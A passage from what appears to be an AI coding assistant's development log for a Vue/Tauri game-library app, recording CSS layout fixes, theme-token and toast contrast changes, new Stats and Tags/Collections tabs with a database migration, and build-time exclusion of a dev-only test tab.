  - The settings view (`AppSettings.vue`/`PluginSettings.vue`) needed the same treatment even though it wasn't the thing asked about - `.content` no longer scrolls at all, so without its own scroll container that view would silently overflow the window with no way to reach anything below the fold. Wrapped both in a new `.settings-scroll` div directly in `App.vue` (same `flex: 1; min-height: 0; overflow-y: auto; padding-bottom: var(--space-5)` treatment, not worth a new component for one wrapper div).
  - `bun run build`/`cargo check` both clean. Not visually verified in a running browser/app window this pass - no screenshot/browser-preview tooling available in this environment - so this is a structural CSS change confirmed by build success and layout reasoning, not an eyeballed one.
  - User confirmed it worked, with one fix needed: a horizontal scrollbar had appeared on all three new scroll containers. Added `overflow-x: hidden` alongside `overflow-y: auto` on `.grid`/`.list`/`.settings-scroll` - `overflow-y: auto` alone doesn't imply `overflow-x: hidden`, so any content sizing right at the container's edge (grid gap rounding, themed scrollbar width itself eating into content width) was enough to trigger a second, unwanted horizontal bar. `bun run build`/`cargo check` both clean.
  - **Regression found by the user**: `.grid`'s new `overflow-x: hidden` clipped `GameCard.vue`'s own `.card:hover { transform: scale(1.06) }` at the leftmost/rightmost column - a scaled edge card now got visually cut off at the container's edge instead of overflowing cleanly the way a scaled middle-column card already does into its neighbor's `gap`. The real cause of the horizontal scrollbar was very likely this same transform in the first place (a transformed element's visual overflow does enlarge a scrollable ancestor's scroll region even though it doesn't affect layout), not a static width mismatch.
  - Fix: reverted `.grid`'s `overflow-x: hidden`, replaced with `padding: 0 var(--space-3) var(--space-5)` instead - giving the leftmost/rightmost column the same breathing room a middle column already gets for free from `gap`, so the hover scale never reaches the container's own edge at all. No scrollbar, no clipping, and `GameListRow.vue` (no hover transform of its own) kept its plain `overflow-x: hidden` unchanged, since it never had this failure mode to begin with. `bun run build`/`cargo check` both clean.
- **Reverted the whole scrollbar-relocation attempt, replaced with a pinned filter bar instead.** User tried the change, hit the `GameCard` hover-clipping regression above, and after seeing it decided the underlying complaint (GameFilters scrolling away along with the list, rather than staying visible as a reference point) was better solved differently - a sticky filter bar, not a per-container scrollbar. Reverted `App.vue`/`GameFilters.vue`/`GameGrid.vue`/`GameList.vue` to their state from right before the relocation commit (`git checkout dfe117d -- <4 files>`, the commit closing Milestone 18, immediately prior to the scrollbar work) rather than hand-reconstructing the old CSS from memory - exact and verifiably clean.
  - `App.vue`'s `.content` goes back to being the single scroll container (`overflow-y: auto`), same as originally, but its top padding moved to `0` - GameFilters.vue's own sticky element carries `padding-top: var(--space-5)` instead, so the visual gap above it stays identical whether it's at rest or pinned. A `position: sticky` element's "stuck" position ignores an ancestor's own padding entirely, so leaving that padding on `.content` would have made the gap collapse to flush the moment it actually stuck.
  - `GameFilters.vue`'s `.filters` gained `position: sticky; top: 0; z-index: 1; background: var(--color-base)` (opaque, so scrolled game rows don't show through underneath once pinned) plus a `border-bottom` for a persistent visual seam between the pinned bar and the scrolling content beneath it.
  - The settings view (`AppSettings.vue`/`PluginSettings.vue`) needed its own top-padding wrapper (`.settings-panel`) for the same reason as the earlier attempt's `.settings-scroll` - it has no sticky element of its own to carry that spacing, so `.content`'s dropped top padding needed to land somewhere.
  - Verified via compiled CSS: `.filters[data-v-*]` carries `position:sticky;top:0` plus the background/border, `.content[data-v-*]` compiles with `padding:0 var(--space-6) var(--space-5)`, `.settings-panel[data-v-*]{padding-top:var(--space-5)}`. `bun run build`/`cargo check` both clean.
- **Two visual bugs found by the user once running it.** (1) The `border-bottom` added along with the pinned bar looked wrong - since it was a decorative extra added on my own initiative (not something asked for, just a "nice to have" divider), removed it outright rather than guess at what specifically looked off about it. (2) More substantively: hovering a top-row `GameCard` rendered *over* the pinned filter bar instead of being masked by it - `.filters`'s `z-index: 1` lost to `GameCard.vue`'s own `.card:hover { z-index: 2 }`, and its Teleported-to-`<body>` balloon (`z-index: 100`) lost even worse, since a Teleported element competes at the document-root stacking context, not wherever it's declared in the template. Bumped `.filters` to `z-index: 150` - high enough to clear both, since neither `#app` nor any ancestor between it and `.filters` sets its own `z-index`/`position`/`isolation` to trap `.filters`'s stacking context below that level. Verified via compiled CSS: `.filters[data-v-*]` now has `z-index:150`, no `border-bottom` property left. `bun run build`/`cargo check` both clean.
- **Third visual bug, also found by the user.** After the z-index fix, hovered edge-column `GameCard`s in rows scrolled to sit right under the pinned bar bled sideways past `.content`'s own edge instead of staying contained - asked the user two clarifying questions before touching anything again (was it every row or specifically bar-adjacent ones; was the leak vertical, over the bar itself, or horizontal, off to the side) rather than patch blind a third time, given the last two fixes had each introduced a new regression. Confirmed: bar-adjacent rows specifically, and horizontal.
  - Root cause: `.content`'s `overflow-y: auto` doesn't reliably guarantee `overflow-x` clips too (the CSS spec's computed-value coupling between the two axes isn't something to lean on implicitly, same lesson as the earlier `.grid`/`.list`/`.settings-scroll` horizontal-scrollbar fix a few entries up) - a hovered edge card's `scale(1.06)` was escaping `.content`'s clip boundary sideways. Not fully certain why this specifically presented for bar-adjacent rows rather than uniformly across all rows (couldn't verify in a live browser), but the fix addresses the actual overflow mechanism directly rather than the symptom, so it should hold regardless of the precise trigger.
  - Fix: added `overflow-x: hidden` explicitly to `.content`. Learned from the earlier `.grid`-level version of this exact problem (that one clipped the hover scale itself, since `.grid` had almost no horizontal padding to absorb the overflow) - `.content`'s existing `var(--space-6)` (2rem) padding is already several times more than a 6% card scale ever needs (a few px), so this clips the sideways bleed without reintroducing that regression.
  - Verified via compiled CSS: `.content[data-v-*]` now has `overflow-x:hidden` alongside its existing `overflow-y:auto` and padding. `bun run build`/`cargo check` both clean. Not visually re-verified in a running app - no browser/screenshot tooling available in this environment for any of this pinned-bar work, flagged honestly rather than claimed as confirmed.
- **Fourth visual bug, this time reported with an actual screenshot rather than only a text description** - the search input visibly stopped well short of the row's full width (a GameCard's diagonal-stripe frame below it, in the same crop, extended edge-to-edge while the search box didn't), even though `.search{flex:1}` inside `.search-row{display:flex}` should in principle stretch it to fill the remaining row width next to `.view-toggle-button`.
  - Applied the standard, well-known fix for exactly this symptom rather than guess at something more exotic: an `<input>` (like other form controls) has a browser-default `min-width: auto` inside a flex row, based on its own intrinsic content size - this can silently override `flex: 1`'s attempt to fill available space, since `flex-basis: 0%` only affects how *extra* space is distributed, not the item's minimum floor. Added `min-width: 0` to `.search` to remove that floor entirely.
  - Also added `width: 100%` to `.filters` itself as a defensive guard (harmless if already redundant) against any unexpected shrink-to-fit sizing, since a screenshot showing the *entire* filter bar (not just the search input specifically) narrower than the grid below made it worth ruling out at the same time rather than fixing the input in isolation and re-testing separately.
  - Verified via compiled CSS: `.filters[data-v-*]` now has `width:100%`, `.search[data-v-*]` now has `min-width:0` alongside its existing `flex:1`. `bun run build`/`cargo check` both clean. Still not visually re-verified live - this is the first bug in this whole pinned-bar saga diagnosed from an actual screenshot rather than a text description alone, which should make it a more confident fix than the earlier three, but confirmation is still pending from the user.
- **`min-width: 0` didn't fix it - user gave the actual structural fix directly**: move the horizontal padding that had been living on `App.vue`'s `.content` down onto `GameGrid.vue`'s `.grid`/`GameList.vue`'s `.list` instead, so `GameFilters.vue`'s `.filters` (which never had its own horizontal padding, only inheriting inset from `.content`) spans `.content`'s *full* width rather than the same inset the grid/list get. Implemented exactly as directed rather than re-diagnosing further, given the previous two self-directed guesses (`overflow-x:hidden` + edge padding, then `min-width:0`) hadn't resolved it.
  - `.content`'s padding: `0 var(--space-6) var(--space-5)` → `0 0 var(--space-5)` - horizontal dropped entirely, bottom (scroll-end breathing room) kept since both views want it regardless of which child now supplies left/right.
  - `.grid` (`GameGrid.vue`) and `.list` (`GameList.vue`) each gained `padding: 0 var(--space-6)` - carrying their own left/right inset now, including the buffer room for `GameCard`'s hover `scale(1.06)` that used to come from `.content`'s padding (`.content`'s `overflow-x: hidden` stays as a safety net, but the actual bleed-prevention buffer lives in `.grid`'s own padding now).
  - The settings view (`AppSettings.vue`/`PluginSettings.vue`) needed the same restoration - its `.settings-panel` wrapper gained the full `padding: var(--space-5) var(--space-6) 0` (previously just `padding-top`, relying on `.content` for the rest) so it doesn't go edge-to-edge as an unintended side effect of a fix that was only supposed to target the library view.
  - Verified via compiled CSS: `.content[data-v-*]{...padding:0 0 var(--space-5)}`, `.grid[data-v-*]{...padding:0 var(--space-6)}`, `.list[data-v-*]{...padding:0 var(--space-6)}`, `.settings-panel[data-v-*]{padding:var(--space-5) var(--space-6) 0}`, `.filters[data-v-*]` unchanged (still no horizontal padding of its own, now correctly spanning the full un-padded `.content` width). `bun run build`/`cargo check` both clean.
- **Confirmed fixed - user asked one more polish step**: with `.filters` now genuinely spanning `.content`'s full width, add matching `var(--space-6)` horizontal padding to `.filters` itself too, so its *content* (the search input/tags) lines up visually with the grid/list below rather than sitting flush against the edges the grid/list are inset from. Replaced `.filters`' `padding-top: var(--space-5)` with `padding: var(--space-5) var(--space-6) 0` - safe with `width: 100%` since the project's global `*{box-sizing:border-box}` reset means padding doesn't add to that width. Verified via compiled CSS: `.filters[data-v-*]` now carries the full 3-value padding. `bun run build`/`cargo check` both clean.

**Fixed a genuinely separate balloon-placement bug the pinned filter bar exposed, plus a bottom-padding polish request.** `useBalloonAnchor.ts`'s "above vs below" decision (`rect.top < MIN_SPACE_ABOVE`, a hardcoded `60px`) assumed the visible area's own top edge was the window's actual `y=0` - true before the filter bar existed, but no longer, since a top-row card scrolled to sit right under the now-pinned bar could still get placed "above," rendering (partially) behind the bar instead of flipping "below" it. The user specifically asked for this to be a real calculation against the bar's actual height, not another magic-number guess.
- Gave `GameFilters.vue`'s `.filters` a dedicated `data-scroll-header` attribute - deliberately not reusing the `.filters` class name itself for this cross-component lookup, since that's a presentational hook that could change independently of "where does the pinned header end" as a concept. `useBalloonAnchor.ts` (used only by `GameCard.vue` now, since `BrickBlockGameCard.vue`'s use was removed along with the rest of Milestone 18's component-swap deletion) queries `document.querySelector('[data-scroll-header]')?.getBoundingClientRect().bottom` at hover time, falling back to `0` if absent (Big Picture/no filter bar present).
- Changed the placement check from `rect.top < MIN_SPACE_ABOVE` to `rect.top - visibleTop < MIN_SPACE_ABOVE` - now measuring the card's clearance from the *real* visible-area boundary (the bar's actual current height, which varies depending on whether the tag-filter row is present) rather than assuming it's always exactly `60px` from the window's top.
- Didn't add a post-render vertical remeasurement/correction pass (unlike the existing horizontal clamp, which does measure the balloon's real `offsetWidth` after mount) - the `MIN_SPACE_ABOVE` margin already accounts for typical balloon height as an estimate, and flipping placement *after* the balloon has already rendered "above" would risk a visible jump; kept scope to the actual reported bug (the boundary reference point being wrong), not a general balloon-height-vs-viewport robustness pass nobody asked for.
- Filter bar bottom padding: added `var(--space-3)` as `.filters`' own bottom padding (was `0`, relying entirely on the external `margin-bottom` for spacing) - purely visual breathing room inside the pinned bar's own background before its content ends, distinct from the gap between the bar and the grid/list below it.
- Verified via compiled CSS: `.filters[data-v-*]` now has `padding:var(--space-5) var(--space-6) var(--space-3)`. `bun run build`/`cargo check` both clean. Not visually re-verified live (no browser tooling available in this environment) - flagged same as every other pinned-bar change this session.

**Added a "UI Test" sidebar tab, replacing the earlier throwaway test button.** New
`AppView` value (`NavSidebar.vue`), new `UiTest.vue` component, wired into `App.vue`'s
existing view-switch (`v-else-if`/`v-else` chain, now three branches instead of two). Moved
the manual actionable-toast trigger here from its temporary spot in `AppSettings.vue`, and
added four more: plain info/success/error toasts, plus a long-message one (to check text
wrapping/sizing at a size the short test messages never exercised). All five are just manual
UI-state triggers, not real functionality - explicitly labeled as such in the tab's own
description text.

**Fixed a real contrast bug in `.toast-info`, found via the Brick Block data theme.** User
noticed info toasts were hard to read specifically under Brick Block - traced it to
`.toast-info`'s `background: var(--color-surface1); color: var(--color-text)` pairing:
Brick Block's `--color-surface1` (`#7c2c00`, a dark saturated brown - the same value used for
button borders) paired with `--color-text` (`#1a1a2e`, dark navy) gives poor contrast, since
`--color-text` assumes a light neutral background that `--color-surface1` isn't guaranteed to
be. This is the exact same problem class already solved for buttons - `--color-button-text`
exists specifically because "a theme with saturated/dark button backgrounds... can override
just this one, without also recoloring body text" (its own doc comment in `styles.css`), and
Brick Block already overrides it to white for that reason. Reused `--color-button-text` for
`.toast-info` instead of `--color-text` - the default Catppuccin theme is unaffected (that
token defaults to `var(--color-text)` there), only themes that override it (like Brick Block)
get the improved contrast. Verified via compiled CSS. `bun run build`/`cargo check` both
clean.

**Two more toast fixes, both found via Brick Block again.** (1) `.toast-success` and
`.toast-error` were both red under Brick Block - `--color-accent` (`#e52521`) and
`--color-danger` (`#b71c1c`) are both red-family hues in that theme's palette, hard to tell
apart at a glance. Switched `.toast-success` to `--color-accent-alt` instead of
`--color-accent` - a theme's two brand colors are already meant to be visually distinct from
each other by construction (that's the whole reason a theme declares two of them), unlike
`--color-accent` vs `--color-danger`, which nothing guarantees are different hues. Happens to
also line up with the near-universal "green means success" convention for Brick Block
specifically (`--color-accent-alt: #43b047`, a real green) and stays a real, distinct color for
the default Catppuccin theme too (purple vs. red), even though it's not literally "green"
there. (2) Right-aligned `.toast-actions`' buttons (`justify-content: flex-end`) rather than
left-flush, per direct request - didn't extend this to the update-offer toast specifically
since the change is at the shared `.toast-actions` level, so it applies to every actionable
toast uniformly, not just that one.
- Verified via compiled CSS: `.toast-success{background:var(--color-accent-alt)}`,
  `.toast-actions{...justify-content:flex-end...}`. `bun run build`/`cargo check` both clean.

**Follow-up 1: `--color-accent-alt` reuse was wrong, tried a dedicated token.** User caught
that switching `.toast-success` to `--color-accent-alt` recolors the default Catppuccin Latte
theme's success toast from its old blue-ish accent to purple (`--color-accent-alt: #8839ef`
there) - an unintended side effect of a Brick Block-specific fix. Confirmed via
`grep -rln "color-accent-alt" src` that `.toast-success` was the only real *consumer* of the
token (the other hits - `styles.css`'s own `:root` default plus the four
`catppuccin-*/index.ts` files - only *declare* its per-theme value, they don't use it for
anything else's appearance). No `--color-success` token had ever existed prior to this - the
user's question named one, but the actual prior change was `--color-accent` -> `--color-accent-
alt`, not from any `--color-success`.

First fix attempt: added a new dedicated `--color-success` token to `styles.css`'s `:root`
(`#40a02b`, Catppuccin Latte's "Green"), pointed `.toast-success` at it, gave Brick Block its
own `--color-success: var(--color-accent-alt)` override in the sibling `data-theme-plugins`
repo (version `1.3.1` -> `1.3.2`).

**Follow-up 2: reverted the token, fixed Brick Block's palette instead.** User tested and
reported every theme's success toast looked identical (all green) - because no theme other
than Brick Block ever gave `--color-success` a distinct value; the token added a layer with
no real per-theme variation, all cost no benefit. Reverted `styles.css`/`ToastContainer.vue`
back to `.toast-success { background: var(--color-accent); }`, removed the `--color-success`
declaration entirely. Root problem was always Brick Block's own palette, not the shared
component: `--color-accent` (`#e52521`, red) and `--color-danger` (`#b71c1c`, dark red) are
too close, and `--color-accent` is also used everywhere else (buttons, active tabs, tile
focus ring), so recoloring the toast rule alone wouldn't have fixed those other surfaces
either. Fixed at the source: Brick Block's `manifest.json` `--color-accent` changed from
`#e52521` to `#0058f8` (a Mario pipe-blue, distinct from `--color-accent-alt`'s green and
`--color-danger`'s dark red), version bumped `1.3.2` -> `1.3.3`. This recolors every
`--color-accent`-driven surface in Brick Block, not just toasts - buttons, active nav/tabs,
tile focus ring all shift from red to blue too, which is the intended, theme-wide effect this
time, not a scoped side effect to work around.

Copied the updated manifest into the app's local theme cache (`%APPDATA%/com.bloppy.concourse/
data-themes/brick-block-data-theme/theme.json`) for live testing each time, same pattern as
earlier in the session. `bun run build` clean at every step.

**Follow-up 3: the active-tab recolor turned out unwanted too, given its own opt-in hook.**
The blue `--color-accent` bumped in follow-up 2 also recolored `.accent-active` (the shared
"selected" indicator class - active nav item, tag filter, and every Settings tab, defined once
in `styles.css`, reused across `NavSidebar.vue`/`GameFilters.vue`/`PluginSettings.vue`). Unlike
buttons/tile-focus-ring (fine staying blue), user wanted the selected-tab highlight to *not*
follow the accent color change, without reverting `--color-accent` itself or hardcoding an
exception into the shared class. Gave `.accent-active` its own opt-in hooks instead -
`background: var(--accent-active-background, var(--color-accent))` /
`color: var(--accent-active-color, var(--color-on-accent))` - same fallback-hook pattern
already used for `--button-border-color`/`--tile-*`/`--card-*`. Every theme that doesn't
declare these two new variables is byte-for-byte unaffected (falls through to
`--color-accent` exactly as before). Brick Block's `manifest.json` sets
`--accent-active-background: #fce303` (its existing cover-placeholder star yellow) /
`--accent-active-color: #1a1a2e` (dark navy, for contrast on yellow), version bumped
`1.3.3` -> `1.3.4`. Verified via `bun run build` (clean) and re-synced the local theme cache
copy again.

**`GameListRow.vue` brought closer to `GameCard.vue`'s feature parity, on direct request
("GameList looks too basic, try some features from GameCard").** Suggested and implemented
three concrete, cheap gaps rather than a vague pass:
- `.thumb-placeholder` hardcoded `--color-surface0`/`--color-text` directly instead of the
  same opt-in `--cover-placeholder-*` hooks `GameCard.vue`'s placeholder already exposed - a
  theme setting these (Brick Block's stripe pattern/star color) previously only applied in
  grid view, silently falling back to plain defaults in list view. Copied the same
  background/color/text-shadow fallback pattern; `-font-size` deliberately not reused - list
  rows are far smaller (48x64 thumb) than a full grid card, so the grid-scaled default would
  overflow.
- Added a fetch-metadata spinner overlay (`IconLoader2`, spin animation, dark scrim) matching
  `GameCard.vue`'s, replacing the previous feedback (disabled button + `"..."` label). Wrapped
  `.thumb`/`.thumb-placeholder` in a new `.thumb-wrap` so the overlay has something to
  position against.
- Swapped the "Info" text button for an icon-only `IconInfoCircle` button matching
  `GameCard.vue`'s exactly (title tooltip added), dropping the now-vestigial
  `.actions { font-size: 0.8rem }` override - nothing left in that row is text.

`bun run build` clean after each of the three.

**Fixed a real bug, on direct report: already-loaded games stayed visible and interactable
underneath the skeleton placeholders while a source plugin scan was running.**
`GameGrid.vue`/`GameList.vue` rendered skeleton cards/rows *and* the real, already-loaded
games at the same time (skeletons prepended, real games still rendered below/around them) -
restructured both from a bare `v-if` prefix into a proper `if`/`else` (skeletons-only while
`plugins.scanning`, real games otherwise), so loaded games are fully hidden mid-scan, not just
visually covered. Also locked `App.vue`'s `.content` scroll (`overflow: hidden`) via a new
`scroll-locked` class bound to `activeView === 'library' && plugins.scanning` - scoped to the
library view specifically, since scanning can also be triggered from the Settings tab's own
"Scan Now" button, where locking `.content` would've been an unrelated side effect. `bun run
build` clean.

**Fixed a related real bug the user found immediately after maximizing the window: skeleton
placeholder count was hardcoded (6 cards / 4 rows), leaving a large window's scan-in-progress
view mostly empty below the fold.** Built a new `useSkeletonCount` composable
(`src/composables/useSkeletonCount.ts`) instead of just bumping the hardcoded numbers higher -
measures the container's own `clientWidth` (columns, grid view only) and its *parent's*
`clientHeight` (rows) via `ResizeObserver`, recomputing on resize. Measuring the parent's
height rather than the container's own was deliberate - `.grid`/`.list`'s own height is
intrinsic to its children while only a handful of skeletons exist, so measuring it directly
would be circular; the parent (`.content`, the actual scrollable viewport) has a stable height
independent of what's currently rendered inside it. Deliberately overestimates rather than
undershoots - during a scan the container's scroll is locked (previous fix), so a few
extra off-screen skeletons just get clipped, not left as a visible gap. Wired into both
`GameGrid.vue` (`itemWidth: 140, itemHeight: 187, gap: 16` - matching `.grid`'s own
`minmax(140px, 1fr)` column width and the resulting 3:4 card aspect ratio) and
`GameList.vue` (`itemHeight: 82, gap: 8`, no `itemWidth` since list rows are full-width).
`bun run build` clean.

**`GameListRow.vue` redesigned on direct request: drop the thumbnail, use cover art as the
row's own background, collapse to just the title until hovered.** Removed the separate
48x64 thumbnail entirely - cover art now sets `.list-row-shell`'s own `background-image`
directly (`background-size: cover`), with a left-to-right dark scrim (`linear-gradient(to
right, rgba(0,0,0,0.8) 40%, rgba(0,0,0,0.25))`) keeping title/details readable regardless of
the art's own brightness, while still letting the art show through on the right. No-cover
fallback uses the `background` shorthand (not `background-image` alone) pointed at the same
`--cover-placeholder-*` hooks as before - the shorthand matters here since the plain-color
default isn't valid syntax for `background-image` alone. Collapsed by default to just the
title (`min-height: 2.75rem`); hovering expands the row (`min-height: 6rem` transition) and
reveals description/meta/actions via `max-height`/`opacity` transitions - matching
`GameCard.vue`'s existing hover-reveal-footer convention rather than inventing a new one.
`useSkeletonCount`'s `GameList.vue` call updated `itemHeight` 82 -> 44 to match the new, much
shorter collapsed height. `SkeletonRow.vue` matched to the same layout in the same pass (single
title-shaped shimmer bar, no thumbnail box, same `2.75rem` min-height) - once nothing
referenced the old `.list-row-thumb` shared class anymore, dropped it from `styles.css`
entirely rather than leaving it dead. `bun run build` clean throughout.

Three follow-up passes on the same component, all from direct feedback after the redesign
landed:
- **"Buttons need a little padding for spacing"**: `.actions`' button gap bumped `0.35rem` ->
  `var(--space-2)`, plus `padding-left: var(--space-3)`, so the revealed buttons don't sit
  cramped right against the title/details text.
- **"I was meaning each button needs spacing, the button seems too narrow"**: traced to the
  shared `.icon-action-row button` rule's `flex: 1; padding: 0.35rem 0` - that combination only
  produces a reasonably-wide button when the row itself is stretched to a fixed width, true for
  `GameCard.vue`'s absolutely-positioned, full-card-width footer, not true for `.actions` here
  (only as wide as its own content). Without that stretch, `flex: 1` plus zero horizontal
  padding collapses each button down to icon width. Fixed with a scoped `.actions button`
  override (`flex: 0 0 auto; padding: 0.35rem 0.6rem`) rather than touching the shared rule,
  since `GameCard.vue`'s footer still genuinely needs its own `flex: 1` stretch behavior.
- **"0.6rem seems too thick, shorten to 0.35rem, also let the title use full length before
  hovering"**: evened button padding to `0.35rem` all around. Separately, `.actions` had only
  ever animated `opacity`, so it still occupied its full flex-row width invisibly even while
  "hidden," capping how much space the title/details could actually use pre-hover. Changed
  `.actions` to collapse via `max-width: 0 -> 12rem` (plus `padding-left`) instead, so the
  title spans the row's entire width until hovered, not just up to wherever the invisible
  button group sat.

`bun run build` clean after each.

**Fixed a real theming gap, on direct report: "the tiles in slide show doesn't match to grid
ones."** Traced to `BigPictureSlideshow.vue`'s strip covers rendering their own hardcoded
`img`/letter-placeholder markup, never wired into the `cardVisual` AST
(`CardVisualRenderer`/`useActiveCardVisual`) the way `GameCard.vue`/`BigPictureTile.vue`
already are (Milestone 18's "two consumers of the same registry" - now three). Under a theme
with a custom `cardVisual` (Brick Block's star placeholder), grid and Big Picture grid tiles
rendered it correctly while the slideshow silently fell back to a plain letter. Fixed with the
identical pattern both existing consumers use, reusing the shared `.bp-cover-frame`/
`.bp-cover-placeholder` classes the slideshow already had for layout - no new CSS needed.
`bun run build` clean.

**New "Stats" sidebar tab, on request after being asked what else the sidebar could use.**
Recommended this over a tags/collections manager since playtime tracking is already a core
proposal feature with no dedicated view surfacing it in aggregate - pure read-only presentation
of data already being collected, no new interaction model. Added
`PlaytimeRepository.getRecentlyPlayed(limit)` (`SELECT game_id, MAX(end_time) as last_played
... GROUP BY game_id ORDER BY last_played DESC`) since "last played per game" only exists in
the session log, never on the `games` row's own `total_playtime` aggregate - and a new
`stores/stats.ts` wrapping it. `StatsPanel.vue` shows a total games/hours summary, a "Most
Played" top-5 list (sorted client-side off `library.games`, already loaded - no new query
needed for this part), and a "Recently Played" list (maps `stats.recentlyPlayed`'s ids back
onto `library.games`, dropping any id whose game was since deleted). Deliberately reuses
`GameListRow.vue`'s just-built cover-as-background row look for visual consistency, but
static - no hover-expand, since these rows are informational, not actionable. Wired into
`NavSidebar.vue`'s `AppView` union and `App.vue`'s view-switch. `bun run build` clean.

**Made "UI Test" genuinely dev-only, not just hidden from the nav, per explicit instruction
given before starting the Stats-tab work.** First attempt: gate the nav button and the
`<UiTest>` usage behind a `v-if="import.meta.env.DEV"`. Hit two real problems in sequence: (1)
`import.meta` isn't valid syntax inside a Vue template expression at all (parsed in
non-module scope) - `vite build` failed outright with a parser error, fixed by reading it once
into a script-level `const isDev = import.meta.env.DEV` and using `v-if="isDev"` instead. (2)
Even with that fix, a `bun run build` + grep of the actual `dist/assets/*.js` output for
`UiTest`-only strings (`testActionToast`, etc.) found them still present - a plain template
`v-if` isn't provably `false` to Terser, since Vue's compiled render function reads component
state through a reactive proxy (`_ctx.isDev`), not a traceable local constant it can fold. The
whole `UiTest.vue` import stayed bundled despite the button being hidden. Real fix: gate a
*dynamic* `import()` behind a literal `import.meta.env.DEV` ternary directly in `App.vue`'s
`<script>` (`defineAsyncComponent(() => import("./components/desktop/UiTest.vue"))` when
`DEV`, `undefined` otherwise), rendered via `<component :is="UiTest" v-if="UiTest" />`. That
ternary sits at a scope Vite's build-time `DEV` replacement can fold to a literal `false`
before Rollup bundles anything, so the whole import (and `UiTest.vue`'s compiled code) is
eliminated from the production graph entirely - confirmed by rebuilding, re-grepping
`dist/assets/*.js`, and finding zero `UiTest`-only strings this time. This also means any
tagged release (which builds in production mode) automatically ships without the tab, with no
separate CI-side exclusion step needed.

**New "Tags & Collections" sidebar tab, on request, plus a genuinely new Collections
feature the user asked for by name - separate from tags, for grouping a series/franchise.**
Recommended a Tags/Collections manager as the other Stats-tab-adjacent suggestion earlier;
user confirmed and explicitly scoped it further: standalone tag creation (not just the
existing implicit-create-via-tagging-a-game), and Collections as its own concept, "not
related to tags for series."

- **Schema**: new migration `v3` (`db.rs`) - `collections`/`game_collections`, structurally
  identical to `tags`/`game_tags` (`UNIQUE` name, cascade-on-delete join table). Deliberately a
  separate table rather than a `"collection:"`-prefixed tag or a `kind` column on `tags` - the
  user's own framing ("not related to tags") meant the two should never be able to collide or
  need disambiguating in a shared table. Added as a new additive migration, not edited into
  `v1`'s baseline - the app is past `1.0.0` now (real installs may already have a `library.db`
  on disk), so `v1`'s squashed baseline text has to stay byte-for-byte frozen per its own
  comment; `v2` (`plugin_capability_grants`) already established this precedent.
- **`src/db/collections.ts`**: new `CollectionRepository`, mirrors `TagRepository`'s existing
  4 methods (`addToGame`/`removeFromGame`/`getAll`/`getForGame`) exactly, plus 4 new management
  methods both repositories now share: `create` (standalone, the actual "add tag" ask -
  distinct from `addToGame`'s implicit-create-as-a-side-effect), `rename` (merges into the
  target name if it already exists, rather than erroring on the `UNIQUE` constraint),
  `delete` (cascades to the join table on its own), and `getUsageCounts` (games-per-tag/
  collection, for the manager's own list - no existing aggregate covers this, same reasoning
  as `PlaytimeRepository.getRecentlyPlayed` needing its own query for "last played"). Not
  abstracted into one shared generic repository despite the two being structurally identical -
  SQLite doesn't allow parameterizing table/column names via bound placeholders, so a truly
  shared implementation would need runtime string interpolation into SQL for the table name,
  which isn't worth the small duplication it would save.
- **`stores/library.ts`**: added `gameCollections`/`allCollections`/`activeCollectionFilter`
  state and `addCollection`/`removeCollection`/`toggleCollectionFilter` actions, mirroring the
  existing tag state/actions exactly, plus the 8 new management actions
  (`create`/`rename`/`delete`/`getUsageCounts` x2, tags and collections) needed by the new
  manager tab. `refresh()`/`filteredGames` extended to also load and filter by collection,
  alongside the existing tag logic.
- **`TagsCollectionsPanel.vue`** (new): two sections (Tags, Collections), each with an
  add-new form, and a list showing each name, its usage count, and inline rename (click the
  pencil icon, `Enter`/`Esc` to confirm/cancel) plus delete - no confirm dialog on delete,
  matching the existing lightweight `deleteGame`/`removeTag` convention elsewhere in the app
  rather than introducing a new interaction pattern just for this screen.
- **`EditGame.vue`**: added a "Collections" section, byte-identical in structure to the
  existing "Tags" section (pill list + remove button + add form) just pointed at the new
  collection actions - per-game assignment needed to exist somewhere for Collections to be
  useful at all, and Tags' existing UI was the obvious template.
- **`GameFilters.vue`**: added a second `.tags` row for collections, identical pattern to the
  existing tag-filter row (click a pill to toggle `activeCollectionFilter`) - collections
  existing purely as an `EditGame.vue`-only assignment with no way to actually browse the
  library by series would have left the feature without its main practical payoff.
- Wired into `NavSidebar.vue`'s `AppView` union (`"tagsCollections"`) and `App.vue`'s
  view-switch, same pattern as the Stats tab.
- `bun run build`/`cargo check` both clean.

**Follow-up, on request: split the combined panel into two separate tabs, reuse GameList's
row look, and pin the add-form to the top.** Split `TagsCollectionsPanel.vue` into
`TagsPanel.vue`/`CollectionsPanel.vue` - genuinely identical create/rename/delete/usage-count
interaction, differing only in which store actions they call, so extracted the shared state
machine into a new `useNamedItemManager` composable (`create`/`rename`/`delete`/
`getUsageCounts` passed in) rather than duplicating it twice. Item rows now use the shared
`.list-row-shell` class (border/radius/padding) instead of a locally-duplicated near-identical
rule, matching `GameListRow.vue`'s visual weight. Each panel's add-form is now pinned via
`position: sticky; top: 0`, same pattern as `GameFilters.vue`'s `.filters`, so it stays
reachable while scrolling a long list.

Hit one real bug wiring the composable: it originally returned a plain object of refs
(`{ counts, newName, ... }`), and a template accessing a *nested* property of a returned
object (`manager.editingName`, `manager.counts[name]`) doesn't get Vue's ref-auto-unwrap
behavior the way a *top-level* returned ref would - that only applies to the immediate
binding, not properties reached via dot access on a plain object. `vue-tsc` caught this
immediately as a real type error (comparing a `Ref<string|null>` to a `string`, indexing a
`Ref` with a string key), not a runtime-only bug. Fixed by wrapping the composable's return
value in `reactive({...})` instead of a plain object - `reactive()` auto-unwraps nested refs
on property access, so `manager.foo` reads/writes `foo.value` transparently, the standard fix
for this exact composable-return shape. Renamed `NavSidebar.vue`'s `AppView` variant from the
single `"tagsCollections"` to `"tags"`/`"collections"`. `bun run build` clean.

**Fixed a real bug reported directly: the sticky header touched the titlebar as the page
scrolled.** `App.vue`'s shared `.settings-panel` wrapper supplies `padding: var(--space-5)
var(--space-6) 0` around whatever view it hosts (Stats/Settings/UiTest/these two) - that
padding-top only ever applies to `.settings-panel`'s own padded box, so it supplied the
*initial* gap above `.sticky-header` correctly, but the moment the list scrolled, sticky
positioning pins the header relative to the actual scroll container's top edge (`.content`),
not `.settings-panel`'s padded position - the gap visually disappeared and the header sat
flush against the titlebar. Exact same bug class `GameFilters.vue`'s `.filters` already hit
and fixed once (see that milestone's own entry). Same fix here: `.panel` gets
`margin-top: calc(var(--space-5) * -1)` to cancel the parent's padding-top entirely, and
`.sticky-header` gains that same `var(--space-5)` back as its own `padding-top` - now living
on the element that's actually sticky, so the gap persists at every scroll position instead of
only before the first one. Didn't touch the shared `.settings-panel` rule itself, since
